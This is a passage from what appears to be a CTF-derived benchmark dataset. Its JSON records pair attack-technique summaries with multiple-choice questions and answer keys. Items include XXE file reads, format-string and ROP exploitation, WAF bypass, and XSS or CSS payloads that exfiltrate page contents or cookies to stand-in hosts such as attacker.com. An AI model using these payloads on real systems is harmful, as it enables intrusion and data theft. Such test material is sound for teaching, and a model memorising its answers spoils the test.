            "When given a challenge that integrates complex numbers with RSA, involving equations such as \\(x^2 + y^2 = z^t\\) and transforms it into operations within the complex number domain \\(\\mathbb{Z}[i]\\), what approach is primarily utilized to reveal the prime factors of the RSA modulus? - A. Bundling complex numbers as pairs and using them directly in RSA equations without modification. - B. Applying Euclidean algorithm in the complex plane to directly find \\(p\\) and \\(q\\). - C. Factoring \\(z\\) into Gaussian integers and using these factors to solve for potential candidates for \\(p\\) and \\(q\\). - D. Taking the absolute values of complex numbers as direct substitutes for \\(p\\) and \\(q\\). "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "file reader",
        "write_up": "dataset/raw/file reader.md",
        "type": "web",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 459,
        "max_score": 1000,
        "difficulty": 0.459,
        "knowledge": [
            "To bypass file path restrictions in Python applications using `glob.glob` function, utilize shell-style wildcards to match the desired file if direct access is blocked. This method exploits the pattern matching capability of `glob` to complete patterns that can match filenames on the system where `*` represents any sequence of characters. Example payload: `/flag.tx*`.",
            "In web applications vulnerable to XXE (XML External Entity) through file uploads, manipulate internal XML files of supported formats (e.g., DOCX) to inject malicious entities. Altering XML content to include external entities or payloads can force the application to disclose information, such as file contents. This requires crafting or modifying an XML file within the uploaded document that includes the malicious payload. Example payload in DOCX `app.xml` to retrieve external data:\n```xml\n<!ENTITY xx SYSTEM \"file:///flag.txt\">\n<Pages>&xx;;</Pages>\n```"
        ],
        "question": [
            "In a Python application using the `glob.glob` function, how can you access a file named `/flag.txt` that is explicitly blocked by a filter? Given the filter prevents direct access to some files based on their paths. - A. Use file descriptor to open `/flag.txt` directly bypassing the filter. - B. Utilize the `os.path` module to manipulate the path and bypass the filter. - C. Replace the blocked file path with a non-existent one. - D. Use shell-style wildcards, such as `/flag.tx*`, to bypass the filter by exploiting the pattern matching feature of `glob.glob`. ",
            "How can an attacker exploit a web application vulnerable to XXE through file uploads, specifically when the application processes DOCX files? - A. Alter the DOCX file to execute JavaScript code when opened by the application. - B. Modify an XML file within the DOCX document to include an external entity `<ENTITY xx SYSTEM \"file:///flag.txt\">` and extract sensitive data like `/flag.txt`. - C. Upload a malicious DOCX file that automatically downloads and executes a remote payload when opened. - D. Embed a PHP script in the DOCX file that is executed on upload, providing remote code execution capabilities. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "File_Size_Matter_Not",
        "write_up": "dataset/raw/File_Size_Matter_Not.md",
        "type": "forensics",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 495,
        "max_score": 1000,
        "difficulty": 0.495,
        "knowledge": [
            "When dealing with forensics challenges that involve analyzing a file with unknown content or format, `binwalk` is a useful tool to identify and extract embedded data within the file. This approach is particularly effective in scenarios where the file's structure is non-standard or when looking for hidden elements in the file's binary data. This extraction process can reveal hidden files and metadata that are essential for progressing in the challenge.\n   - Example command: `binwalk -e filename`",
            "For forensics challenges that result in a collection of fragmented files without clear headers or that appear to be parts of a larger file, concatenating these files in the correct order can be a crucial step toward reconstructing the original file. This is especially relevant when the file fragments do not start with recognizable headers, indicating they are middle or end pieces of a complete file. The Unix `cat` command can be utilized for this purpose to sequentially combine these files into a single file, which can then be further examined or utilized as needed.\n   - Example command for concatenation: `cat file1 file2 > resultfile`"
        ],
        "question": [
            "In a forensic analysis scenario, when presented with a file lacking an identifiable extension and traditional file structure, which Linux command is most effective for extracting and identifying embedded data from such files? - A. `ls -l` - B. `grep -r` - C. `binwalk -e` - D. `chmod +x` ",
            "During a forensic challenge, you have several fragmented files suspected to be parts of a larger, crucial file. These fragments lack recognizable headers, suggesting they are segments of a complete document rather than standalone items. Which Unix command correctly describes the method to combine these fragments into a single file for analysis? - A. `split -b` - B. `cp file1 + file2 resultfile` - C. `merge file1 file2 -o resultfile` - D. `cat file1 file2 > resultfile` "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Finches in a Stack",
        "write_up": "dataset/raw/Finches in a Stack.md",
        "type": "pwn",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 350,
        "max_score": 700,
        "difficulty": 0.5,
        "knowledge": [
            "When encountering a format string vulnerability, it's possible to leak critical information such as stack canary values by specifying the correct offset in the format string payload. This technique can be applied by using a payload that includes `%[offset]$p` to read values from the stack. Condition: This knowledge is applicable in scenarios where the application prints back user input without proper formatting, potentially leading to information disclosure.\nExample payload: `%11$p` to leak the canary value at the 11th position on the stack.",
            "In instances of stack buffer overflow vulnerabilities with stack canary protection enabled, and when the location of the `flag` function or critical function is known (for example, when PIE is not enabled), the exploit strategy can include leaking the canary value first and then crafting a payload that overwrites the return address with the desired function's address. The payload will have to include the correct padding up to the canary, the canary itself to bypass the stack canary protection, additional padding to the return address, and finally, the address of the function that needs to be executed.\nExample payload construction for bypassing the canary and executing a specific function: `b\" \"*offset_canary + p32(canary) + b\" \"*offset_ret + p32(function_address)`."
        ],
        "question": [
            "In a scenario where an application outputs the user input directly without proper sanitization, leading to a format string vulnerability, which payload format allows for the leakage of stack values? - A. `%s` - B. `%x$` - C. `%11$x` - D. `%[offset]$p`",
            "Given a stack buffer overflow vulnerability is identified in a program without PIE (Position Independent Executable) enabled and knowing the stack canary protection is enabled, how should the payload be constructed to exploit the vulnerability and execute a specific function by address `0x080491d2`? - A. `b\"AA\" + p32(0x080491d2)` - B. `b\" \"*offset_canary + p32(canary) + b\" \"*offset_ret + p32(0x080491d2)` - C. `p32(canary) + \"AAAA\" + p32(0x080491d2)` - D. `p32(0x080491d2) + \"AAAA\" + p32(canary)`"
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Finding Artifacts 1",
        "write_up": "dataset/raw/Finding Artifacts 1.md",
        "type": "misc",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When faced with challenges that require identifying specific artifacts or locations based on clues, utilizing search engines with carefully crafted queries can lead to successful identification. For instance, combining specific keywords from the clues (\"bronze statue starting with 'ma'\" + \"prevalent in southern Asia\") can filter out irrelevant information and pinpoint the required details effectively.",
            "In challenges where the task involves finding a physical location based on the identified artifact, a subsequent focused search query that includes the artifact's name and the specific details such as the city or type of location (\"Maitreya Buddha statue museum New York City\") can efficiently direct to the exact place housing the artifact. This approach prioritizes precision in search parameters to narrow down results."
        ],
        "question": [
            "In the process of identifying a specific artifact given limited information, how can search engine queries be optimized to yield relevant results? - A. Use general terms unrelated to the provided clues. - B. Combine specific keywords indicative of the artifact's characteristics with its geographical or cultural significance. - C. Ignore details like geographical or cultural significance to broaden the search results. - D. Use the artifact's incomplete name as the only search parameter.",
            "After identifying an artifact, how should one craft a search query to locate a physical location (like a museum) that houses the artifact? - A. Search using only the city's name to find all possible museums. - B. Utilize vague descriptions of the artifact instead of its specific name. - C. Include both the artifact's name and broad location terms such as the country or city, paired with the type of location sought. - D. Focus solely on the type of location without mentioning the artifact or the city."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Fire in the Androiddd",
        "write_up": "dataset/raw/Fire in the Androiddd.md",
        "type": "reverse",
        "competition": [
            "darkCON/2021",
            "https://ctftime.org/event/1250/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "In challenges where Android applications are analyzed for vulnerabilities, particularly those involving receiving intents, checking the `AndroidManifest.xml` is crucial. It provides detailed information about the components of the application and their properties. For instance, if the `android:exported` attribute of a component is set to true, this implies that the component is accessible by any other application, making it a target for intent-based attacks. To exploit such vulnerabilities, one can use the `adb shell am broadcast` command to send an intent to the application. This technique allows for interaction with the application's components directly from the command line, bypassing the user interface. Example payload: `adb shell am broadcast -a flag_checker -n com.application.darkcon/.MyReceiver --es flag \"your_flag_here\"`",
            "In scenarios involving native libraries in Android applications, particularly for checking flags or performing specific calculations, reverse engineering with tools like Ghidra can uncover the logic behind native functions. Many CTF challenges involve algorithms that generate sequences or perform mathematical operations, which can be critical in decrypting or crafting payloads. For example, discovering a function generates Catalan numbers could lead to understanding the logic required to generate the correct input or flag. To bypass mathematical operations or sequence generation that involve integer overflow, it may be necessary to replicate the algorithm in a higher-level language, accommodating for large numbers or overflow behavior. This approach enables the crafting of inputs that comply with the application's validation mechanism. Sample demonstration snippet in C for a Catalan number generator and Python for applying XOR operations and handling overflows correctly illustrates how to combine reverse-engineered logic and scripting to obtain a flag."
        ],
        "question": [
            "When analyzing security vulnerabilities in Android applications that involve intent reception, why is it crucial to check the `AndroidManifest.xml` file, especially the `android:exported` attribute of components? Consider a scenario where an attacker wants to exploit an exported receiver using an `adb` command.  - A. The `android:exported` attribute does not impact the component's security and can be set to true for all components without any risks. - B. Setting the `android:exported` attribute to false for an activity, service, or receiver ensures that it is accessible from any other application, facilitating interaction through intents. - C. The `android:exported` attribute, when set to true, indicates that the component can be accessed by other applications, making it susceptible to intent-based attacks. An attacker can use commands like `adb shell am broadcast -a custom_action -n package_name/.ReceiverName --es extra_key \"value\"` to interact with the component. - D. The `android:exported` attribute is only relevant for activities and has no effect on services or receivers, thereby not affecting the application's security posture. ",
            "In the context of Android application security, particularly when dealing with native libraries and reverse engineering efforts, why is it important to understand the underlying algorithms used by native functions? Assume you have identified a native function employing a mathematical sequence, like the Catalan numbers, for validation.  - A. Understanding native functions and their algorithms is unnecessary since Android applications do not use native code for security-sensitive operations. - B. Native functions often utilize simple arithmetic operations, making it straightforward to predict their behavior without a deep understanding of the underlying algorithms. - C. Reverse engineering and understanding the algorithms behind native functions, such as sequence generation, is critical for bypassing or satisfying specific validation mechanisms. For instance, if a function uses Catalan numbers for validation, replicating the sequence generation algorithm and correctly handling aspects like integer overflow can be essential for crafting valid inputs or decrypting data. - D. Algorithms used in native functions, especially those involving sequences or mathematical operations, are typically proprietary and encrypted, rendering reverse engineering efforts futile and unnecessary for security analysis. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "first hunt",
        "write_up": "dataset/raw/first hunt.md",
        "type": "web",
        "competition": [
            "snakeCTF/2023",
            "https://ctftime.org/event/2158/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve intercepting or analyzing messages, it's critical to consider encoding methods that might be employed to conceal or transmit data. In scenarios where a message is encoded, decoding it may reveal hints or direct instructions for the next steps. For instance, if a BASE64 encoded message is identified, using a decoding tool or website to revert it to its original form could unveil useful information, such as URLs, credentials, or further instructions.  \nExample action: Use a BASE64 decoding tool or command-line utility like `base64 -d` in Linux to decode the message.",
            "In challenges where an encoded message points to an external resource or website, the username or identifier found within the message can lead to hidden data or accounts relevant to solving the challenge. Specifically, when a username is mentioned, services or websites where users commonly post content, such as Pastebin, GitHub, or social media platforms, should be searched for accounts matching the provided username. This method relies on the assumption that challenge creators might simulate real-world scenarios where individuals share or leak information online.   \nExample action: Search for the username on popular websites or platforms such as Pastebin (`https://pastebin.com/u/[username]`) to find hidden or associated posts that might contain further clues or credentials needed to progress in the challenge."
        ],
        "question": [
            "In a cybersecurity challenge, an investigator comes across an email suspected to be encoded with BASE64. The email is believed to contain a hidden message that could lead to further clues. Which of the following actions should the investigator take to reveal the hidden message? - A. Use the `md5sum` command to hash the email content and search the hash online. - B. Employ a BASE64 decoding tool or command-line utility like `base64 -d` on Linux to decode the message. - C. Run the email through an antivirus scanner to detect potential malware embedded in the encoded message. - D. Translate the email content using an online language translation tool to uncover any hidden messages in foreign languages.",
            "During a cybersecurity competition, participants identify a BASE64 encoded email that, once decoded, reveals a username linked to a Pastebin account. Given the context, what is the most appropriate next step for participants aiming to uncover further information relevant to the challenge? - A. Use a network scanning tool like Nmap to scan the IP address found in the email for open ports and vulnerabilities. - B. Search for the username in the decoded message on social media platforms expecting to find personal information that may be used in a password guessing attack. - C. Perform a Google search for the decoded email content to see if it has been referenced in any public forums or blogs. - D. Search for the username on Pastebin (`https://pastebin.com/u/[username]`) to find any posts that might contain additional clues or credentials."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Flag SP-network",
        "write_up": "dataset/raw/Flag SP-network.md",
        "type": "reverse",
        "competition": [
            "BSidesBOS/2020",
            "https://ctftime.org/event/1125/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing an encryption algorithm that involves key expansion from a smaller key and repetitive operations like byte rotation and XOR for each block of data, the decryption process can often be approached by reversing these operations one step at a time. Specifically, if the encryption uses round keys generated by simply rotating the original key and XOR operations for encryption, decryption can be achieved by applying the inverse operations in reverse order, using the round keys in the opposite sequence. This approach is particularly effective when the encryption scheme provides a bijective (one-to-one and onto) mapping between input and output values, as demonstrated by a substitution lookup table (`lut`) that has a unique output for every unique input. To construct a decryption function, one needs to invert the key operations (such as using the original keys in reversed order for XOR) and reverse engineer any substitution functions by using an inverted lookup table. This method is conditioned on being able to isolate and invert each step of the encryption process based on understanding its components, such as the key expansion, block processing, and substitution mechanisms used.",
            "For encryption algorithms where the key is relatively small or follows a predictable pattern (e.g., two random bytes repeated multiple times to form a larger key), a brute-force approach to discover the key is feasible. This is because the effective keyspace is significantly reduced, making it practical to iterate through all possible combinations of the key components. In the scenario where the key consists of two bytes repeated to form an 8-byte key, there are only \\(256^2\\) or 65,536 possible keys to test, which is computationally manageable on modern hardware. This approach requires that the decryptor knows or can guess a pattern in the plaintext (such as the plaintext starting with a known sequence like \"flag\") to verify when the correct key has been found. Utilizing this pattern as a condition for stopping the brute-force search can efficiently lead to the discovery of the correct decryption key, thus revealing the encrypted information. \n\nExample payload for attempting decryption with every key possibility:\n```python\nfor x in range(256):\n    for y in range(256):\n        candidate_key = [x, y] * 4\n        try:\n            decrypted_text = decrypt(ciphertext, candidate_key)\n            if decrypted_text.startswith(\"flag\"):\n                print(f'Found flag: {decrypted_text}')\n                break\n        except Exception as e:\n            continue\n```"
        ],
        "question": [
            "In the context of decrypting data encrypted with a custom algorithm that uses round keys derived from the original key through simple byte rotation, what is the correct approach to reverse the encryption process? - A. Increment the key values instead of reversing the key rotation and XOR operations. - B. Use the same order of round keys for decryption as was used for encryption. - C. Apply the round keys in the opposite sequence and invert any substitution functions by using an inverted lookup table. - D. Apply a fixed transformation to the ciphertext without considering the original key or the round keys.",
            "When faced with an encryption scheme where the key is comprised of two unique bytes repeated multiple times to extend its length, under which condition is a brute-force key discovery approach practical? - A. Only when the key exceeds 256 bytes in length, ensuring a large enough keyspace for security. - B. When the algorithm uses a complex function that changes the key dynamically during the encryption process. - C. When the keyspace is small enough to allow iteration through all possible key combinations, making it feasible to discover the key by trial and error, especially if the correct key can be verified against a known plaintext pattern. - D. If the encryption does not use a standard algorithm like AES or RSA, making traditional cryptographic attacks impossible."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "FlagConverter Part 3",
        "write_up": "dataset/raw/FlagConverter Part 3.md",
        "type": "forensics",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": 338,
        "max_score": 500,
        "difficulty": 0.676,
        "knowledge": [
            "When dealing with memory dumps in forensics challenges, the first approach should be identifying the nature of the dump and the operating system it belongs to using tools like `imageinfo` in Volatility. This establishes a base understanding of the environment, guiding subsequent analysis steps such as process listing, clipboard contents examination, file scanning, and screenshot extraction. Example command: `volatility -f flagchecker.dmp imageinfo`.",
            "In encryption-related challenges, especially when dealing with AES encryption, analyzing the application's source code can reveal the encryption method, key, and IV generation logic. If the key and IV are derived from known or predictable information (e.g., SID in Windows environments), this information can be utilized to recreate the encryption environment and decrypt the ciphertext. A hybrid approach, combining understanding of .NET decompilation to analyze the encryption implementation with tools like dotPeek and applying cryptographic libraries in Python for decryption, can be particularly effective. A decryption sample in Python would be:\n   ```python\n   from Crypto.Cipher import AES\n   key = b'<key derived from analysis>'  # Hex string converted to bytes\n   IV = b'<IV derived from analysis>'    # Hex string converted to bytes\n   cipher_text = b'<base64 decoded cipher text>'\n   mode = AES.MODE_CBC\n   decryptor = AES.new(key, mode, IV=IV)\n   plain_text = decryptor.decrypt(cipher_text).rstrip(b\"\\x00\")\n   print(plain_text.decode('utf-8'))\n   ```"
        ],
        "question": [
            "In a forensic analysis scenario involving a memory dump from a system, you are tasked to initiate the analysis to determine details about the dumped image. Which of the following Volatility commands would be your first choice to identify the nature of the dump and the operating system? - A. `volatility -f dumpfile.dmp pslist` - B. `volatility -f dumpfile.dmp filescan` - C. `volatility -f dumpfile.dmp clipboard` - D. `volatility -f dumpfile.dmp imageinfo`",
            "When analyzing a .NET application involved in an encryption process that encrypted the flag, you come across the following key and IV generation code snippet: ```csharp public void function03() { byte[] binaryForm = new byte[28]; WindowsIdentity.GetCurrent().User.GetBinaryForm(binaryForm, 0); this.byte_1 = new byte[16]; Array.Copy((Array) binaryForm, 0, (Array) this.byte_1, 0, 16); this.byte_0 = new byte[32]; Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 0, 16); Array.Copy((Array) binaryForm, binaryForm.Length - 16, (Array) this.byte_0, 16, 16); } ``` Based on the code and understanding of AES encryption, which piece of information is crucial for decrypting the ciphertext encrypted by this application? - A. The hexadecimal values of `byte_0` and `byte_1`. - B. The current user's WindowsIdentity SID. - C. The exact size of the application's executable file. - D. The timestamp when the encryption happened."
        ],
        "answer": [
            "D.",
            "B."
        ]
    },
    {
        "name": "flagrom",
        "write_up": "dataset/raw/flagrom.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 187,
        "max_score": 500,
        "difficulty": 0.374,
        "knowledge": [
            "When dealing with embedded systems like an 8051 board with SecureEEPROM interacting via the I2C protocol, if direct memory read operations are restricted due to security measures, manipulation of the I2C traffic can be a viable workaround. Specifically, initiating a sequence of I2C start conditions without corresponding stop conditions can be utilized to bypass secure memory read restrictions. This technique hinges on understanding and exploiting the state machine governing the I2C communication in the target device, allowing one to change the operation context (e.g., from write to read operation) without triggering security constraints that block access to sensitive data like flags.",
            "Crafting a custom payload to interact with hardware-specific features, such as directly controlling I2C SDA (Serial Data Line) and SCL (Serial Clock Line) lines, can be achieved by defining special function registers (SFR) in code and manipulating them accordingly. This approach requires a detailed understanding of both the target hardware architecture and the protocol used for communication. In scenarios where standard library functions or existing routines do not offer the required control or functionality, directly accessing and manipulating hardware registers can enable complex interactions with connected devices or peripherals, like sending partial byte sequences or artificially crafting protocol-specific conditions to access secured data areas.\n\nSample Payload Snippets for I2C Manipulation:\n\n```c\nvoid send_start(void) {  \n RAW_I2C_SCL = 0;  \n RAW_I2C_SDA = 1;  \n RAW_I2C_SCL = 1;  \n RAW_I2C_SDA = 0;  \n}\n\nvoid send_7bit(unsigned char byte) {  \n for (unsigned char i = 1; i < 7; i++) {  \n   RAW_I2C_SCL = 0;  \n   RAW_I2C_SDA = ((byte >> (7 - i)) & 1) != 0;  \n   RAW_I2C_SCL = 1;  \n }  \n}\n```"
        ],
        "question": [
            "In the context of an 8051 microcontroller setup utilizing SecureEEPROM protected by an I2C protocol, when direct memory access to secure regions is prohibited, how can one bypass this limitation using I2C start and stop conditions? - A. By continuously sending I2C stop conditions, followed by start conditions, ensuring the data direction bit is correctly set to enable reading from secure memory. - B. By never sending an I2C stop sequence after a start sequence, and manipulating the I2C start conditions to change operation contexts without triggering secure read blockades. - C. By only using I2C start conditions for data transmission, completely avoiding stop conditions to trick the EEPROM into a write-only mode. - D. By alternating between I2C start and stop conditions rapidly to confuse the EEPROM security mechanism, enabling unauthorized read access.",
            "In the challenge involving an 8051 board and SecureEEPROM with communication via the I2C protocol, how can specific hardware features like the I2C SDA and SCL lines be directly controlled to craft a custom payload bypassing secured areas? - A. By utilizing standard peripheral library functions to interact with the I2C lines, ensuring timing and protocol accuracy. - B. Through the definition of interrupt service routines that automatically handle the I2C start and stop conditions. - C. By defining special function registers (SFR) in the code for RAW I2C SDA and SCL lines and manually controlling these lines to send partial byte sequences or specific protocol conditions. - D. Employing built-in high-level I2C transaction commands provided by the 8051 microcontroller to bypass the security features of SecureEEPROM."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Flags",
        "write_up": "dataset/raw/Flags.md",
        "type": "web",
        "competition": [
            "Defcamp/2018/Quals",
            "https://ctftime.org/event/654/tasks/"
        ],
        "score": -1.0,
        "max_score": 369,
        "difficulty": -1,
        "knowledge": [
            "When encountering challenges with Content-Security-Policy (CSP) restricting JavaScript but allowing CSS, CSS injection can be used to leak information. This is particularly applicable in scenarios where the application outputs user input directly into the HTML without proper escaping, allowing an attacker to introduce CSS selectors. These selectors can be crafted to load external resources based on the presence of specific values within attributes, such as input values. By monitoring the requests to the external resources, an attacker can gradually infer sensitive data like flags or tokens.\n   \n   Example payload for leaking a flag character by character:\n   ```html\n   <style>\n   input[value^=\"FLAG_PREFIX{a\"] { background-image: url(http://yourserver.com/a); }\n   input[value^=\"FLAG_PREFIX{b\"] { background-image: url(http://yourserver.com/b); }\n   ...\n   </style>\n   ```",
            "In a scenario where direct JavaScript execution is prevented, for instance, due to restrictive CSP policies or lack of suitable injection points, and the goal is to exfiltrate sensitive information, leveraging the `fetch` API in a Cross-Site Scripting (XSS) payload allows for the reading and external transmission of data from restricted pages. This method is effective in circumstances where the application logic or flow can be manipulated externally but is safeguarded against conventional XSS techniques. This technique can circumvent limitations such as HttpOnly cookies, by directing the stolen data (encoded in Base64 or another URL-safe encoding) to an attacker-controlled server without needing to access the cookies directly.\n\n   Example payload for exfiltrating page contents using fetch and Base64 encoding:\n   ```javascript\n   javascript:fetch('/sensitive_page').then((r) => r.text()).then((r) => window.location.href='http://yourserver.com/'+window.btoa(r))\n   ```"
        ],
        "question": [
            "In a web challenge, an attacker aims to exploit a website's Content-Security-Policy (CSP) that restricts JavaScript usage but allows CSS, to leak an admin's flag. The webpage includes an input field that holds the user flag value. Given the following CSP setup: ```html <meta http-equiv='Content-Security-Policy' content=\"script-src 'nonce-randomValue'; object-src 'none'; base-uri 'none' require-trusted-types-for 'script'; frame-src 'none'\"> ``` Which of the following methods would be effective for the attacker to gradually leak the admin's flag character by character? - A. Crafting JavaScript payloads that execute upon user interaction. - B. Injecting CSS rules that change the appearance of the webpage based on the input value's first character. - C. Using SQL injection to bypass the CSP entirely. - D. Directly reading the input field's value using cross-site scripting (XSS). ",
            "Consider a scenario in a web challenge where an attacker finds an XSS vulnerability on a platform with a strict Content-Security-Policy (CSP) that blocks inline and external scripts. The platform includes a sensitive page (`/secret_page`) inaccessible to the attacker. To exploit this, the attacker decides to use the `fetch` API to steal the contents of this page. Which of the following payloads would correctly exfiltrate the contents of the sensitive page to the attacker's server, assuming direct JavaScript injection is not allowed, but the attacker can inject into an attribute?  - A. `onerror=\"window.location='http://attacker.com/log?data='+document.cookie\"` - B. `<script>new Image().src='http://attacker.com/?cookie='+document.cookie;</script>` - C. `javascript:alert(document.domain)` - D. `javascript:fetch('/secret_page').then((r) => r.text()).then((r) => window.location.href='http://attacker.com/'+window.btoa(r))` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "flagsifier",
        "write_up": "dataset/raw/flagsifier.md",
        "type": "This write-up corresponds to a **forensics** challenge.",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 271,
        "max_score": 500,
        "difficulty": 0.542,
        "knowledge": [
            "When dealing with Deep Learning models in CTF challenges, specifically those classifying images into classes, examine the model's softmax output for potential insights into the classification mechanism. Every neuron in the output layer is associated with a specific class, and identifying the mapping between output neurons and classes can reveal the model's underlying classification logic. This approach helps in understanding how inputs (in this case, letters or string segments) correspond to specific classifications, which is crucial for crafting inputs that target particular classes or outcomes.",
            "When attempting to reverse-engineer or manipulate the output of a Deep Learning model without detailed knowledge of its training data, leveraging a simple greedy algorithm can be effective. This involves iteratively modifying the input based on the model's output to maximize the activation of a target neuron or class. This technique is beneficial in scenarios where the model may be overfitting specific inputs, as it can exploit the overfitting to identify inputs that produce the desired output without requiring complex optimization algorithms or extensive domain knowledge."
        ],
        "question": [
            "In the context of a Deep Learning model designed to classify images into 40 different classes using a softmax layer, how can the softmax output be utilized to understand the model's classification logic? - A. Interpret output values as probability distribution over classes, with each neuron's activation indicating the confidence level for corresponding class. - B. Use the highest neuron activation as an error rate to measure how many inputs are misclassified. - C. Sum all output neuron activations to determine the overall accuracy of the model. - D. Assign random weights to output neurons to enhance classification unpredictability.",
            "When it comes to manipulating an overfitting Deep Learning model to identify specific classes, which strategy can prove effective despite the absence of detailed training data? - A. Implementing a complex neural network from scratch to clone the model's behavior. - B. Using a simple greedy algorithm to iteratively modify inputs based on model output to maximize target neuron activation. - C. Conducting extensive hyperparameter tuning to recalibrate the model's confidence levels. - D. Applying high-level statistical models to predict the next sequence of inputs for classification."
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "flropyd",
        "write_up": "dataset/raw/flropyd.md",
        "type": "pwn",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": 366,
        "max_score": 1000,
        "difficulty": 0.366,
        "knowledge": [
            "For implementations requiring conditional execution without traditional conditional jumps (`jx`/`jxx`), conditional move instructions (`CMOVxx`) can be utilized to manage decision-making logic within ROP chains effectively. This technique is especially beneficial when aiming to keep the ROP chain linear and deterministic, avoiding the complexities associated with manipulating the stack to achieve conditional branching. Example: `0x000000000012344b : cmovb rax, rdx ; ret` allows for a conditional move based on the condition if 'below' (b), effectively serving as an if statement.",
            "Stack pivoting is a crucial technique in ROP chains for redirecting the stack pointer (`rsp`) to a controlled area of memory, thus gaining control over the stack's contents and flow. This can be achieved through gadgets that manipulate `rsp` directly or through instructions that alter it indirectly, followed by a series of pops to adjust it further or to restore other register values. A typical stack pivoting gadget sequence begins with adjusting `rbp` to point near the desired new `rsp` location and is followed by an instruction such as `lea rsp, [rbp-0x10]`, and a `ret` to execute the pivot. Example payload: \n```\np  = p64(0x00000000000e2fd8 + libc_base)  # lea rsp, [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret\n```\nThis payload demonstrates the precise adjustment of `rsp` through `rbp`, allowing subsequent gadgets to operate on a controlled stack."
        ],
        "question": [
            "In the context of designing a ROP chain for a task requiring conditional execution where traditional conditional jumps cannot be used, which of the following instructions would best suit replacing an 'if' condition to execute based on a specific condition being true? - A. `0x000000000012344b : mov rax, rdx ; ret` - B. `0x000000000012344b : cmovb rax, rdx ; ret` - C. `0x000000000012344b : jmp rax` - D. `0x000000000012344b : call rdx`",
            "In a ROP challenge, you're tasked with manipulating the stack pointer to transition execution to a controlled section of memory. Given the goal to pivot the stack properly, which series of instructions would best achieve this after setting `rbp` to point near the new target `rsp` location? - A. `lea rdx, [rbp+0x10] ; call rdx` - B. `mov rsp, rbp ; pop rbp ; ret` - C. `lea rsp, [rbp - 0x10] ; pop rbx ; pop r12 ; pop rbp ; ret` - D. `push rbp ; mov rsp, rbp ; pop rbp`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "FluxCloud Serverless",
        "write_up": "dataset/raw/FluxCloud Serverless.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": 132,
        "max_score": 500,
        "difficulty": 0.264,
        "knowledge": [
            "When facing a web application firewall (WAF) designed to block requests containing specific keywords (like \"flag\") in the URL path, a bypass technique can involve altering the case sensitivity of the payload. If the WAF checks are case-sensitive and do not account for mixed-case scenarios, changing one or more letters of a keyword to uppercase can successfully bypass the blocklist.  \n   Example payload: `/flAg` instead of `/flag`.",
            "In serverless applications, environment variables are often used to store sensitive information such as flags for CTF challenges. Reviewing the source code, specifically files that interact with environment variables, is a practical approach to locate where flags might be stored. Once the storage mechanism is identified, crafting a request that accesses the variable without being blocked by security filters can lead to successful flag capture.  \n   (No specific payload can be provided for this point as it depends on the application's code and setup.)"
        ],
        "question": [
            "In a scenario where a Web Application Firewall (WAF) is set to block access to URLs containing the word \"flag\", which of the following methods is a viable technique to bypass this security measure? - A. Adding a slash `/` before \"flag\" in the URL - B. Encoding the keyword \"flag\" using URL encoding - C. Changing the word \"flag\" to upper case, like \"FLAG\" - D. Changing one or more characters of \"flag\" to upper case, like \"flAg\"",
            "In the context of serverless applications where a flag is stored as an environment variable, which approach is recommended for locating and accessing the flag's value? - A. Modifying the server's root access settings to publicly expose all environment variables - B. Scanning the server's external ports for vulnerabilities that might expose environment variables - C. Reviewing the source code to identify files that interact with environment variables, aiming to find the storage mechanism for the flag - D. Repeatedly refreshing the application's main page in hopes that a glitch will reveal environment variables"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Follow the Currents",
        "write_up": "dataset/raw/Follow the Currents.md",
        "type": "crypto",
        "competition": [
            "angstrom/2021",
            "https://ctftime.org/event/1265/tasks/"
        ],
        "score": 70,
        "max_score": 300,
        "difficulty": 0.23333333333333334,
        "knowledge": [
            "In crypto challenges where the encryption process involves a keystream generated through deterministic functions based on initial random values, if the initial seed or values are of small size (like 2 bytes), brute-forcing the initial values to recreate the keystream can be a viable strategy to decrypt the message. This is particularly useful when the keystream generation function is known, such as when the source code of the encryption algorithm is provided.",
